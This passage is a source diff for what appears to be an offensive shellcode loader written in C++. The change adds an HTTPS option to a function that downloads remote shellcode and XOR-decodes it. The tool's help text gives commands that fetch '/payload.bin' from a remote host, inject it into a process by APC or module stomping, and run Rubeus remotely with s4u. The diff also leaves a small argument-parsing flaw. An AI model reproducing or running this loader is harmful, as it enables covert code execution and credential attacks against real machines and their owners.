@@ -79,11 +79,11 @@ helper helperHandler;
         return k;
     };
 
-    std::vector<unsigned char> helper::fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key)
+    std::vector<unsigned char> helper::fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key, bool https)
     {
 		std::cout << "-------In fetchRemoteShellcodeAndDecode function-------\n";
 		std::wcout << "downloading shellcode from url: " << std::wstring(url) << " and file: " << std::wstring(file) << "\n";
-        std::vector<unsigned char> rep = DownloadBinary(url, file);
+        std::vector<unsigned char> rep = DownloadBinary(url, file, https);
         if (shellcode_key != 0x00) {
             std::cout << "decoding shellcode with key : " << shellcode_key << "\n";
             helper::xor_shellcode(rep.data(), (int)rep.size(), shellcode_key);
@@ -103,6 +103,7 @@ helper helperHandler;
             "  --remote            Remote host (google.com)\n"
             "  --file              Remote file (/payload.bin)\n"
 			"  --args                args to pass to the file remotely\n"
+			"--use-https           Use HTTPS for remote fetching instead of default http\n"
             "A example for dotnet execution:\n\n"
             ".\\main.exe dotnet --filePath C:\\Users\\ADMIN\\Debug\\test.exe --args test\n"
             ".\\main.exe dotnet --remote 192.168.10.10  --file /Rubeus.exe --args s4u\n"
@@ -114,9 +115,10 @@ helper helperHandler;
             "  --key <hex>            XOR key (default 0x67), use 0x00 if the payload isnt xored\n"
             "  --remote <url>         Remote host (google.com)\n"
             "  --file <path>          Remote file (/payload.bin)\n"
-            "  --help                 Show this help\n"
+            "--use-https           Use HTTPS for remote fetching instead of default http\n"
+            
             "Some example for shellcode execution:\n\n"
-            ".\\main.exe shellcode --pid 1234 --method apc --key 0x67 --remote 192.168.10.12 --file /payload.bin\n"
+            ".\\main.exe shellcode --pid 1234 --method apc --key 0x67 --remote 192.168.10.12 --file /payload.bin --use-https\n"
             ".\\main.exe shellcode --pid 1234 --method stomp --key 0x10\n";
     }
 
@@ -150,6 +152,9 @@ helper helperHandler;
             else if (arg == "--pid" && i + 1 < argc) {
                 opt.pid = std::stoi(argv[++i]);
             }
+            else if (arg == "--use-https" && i + 1 < argc) {
+                opt.https = true;
+            }
 
             else if (arg == "--method" && i + 1 < argc) {
                 opt.method = argv[++i];
@@ -169,6 +174,7 @@ helper helperHandler;
                 std::string tmp = argv[++i];
                 opt.file = std::wstring(tmp.begin(), tmp.end());
             }
+
         }
 
         return opt;
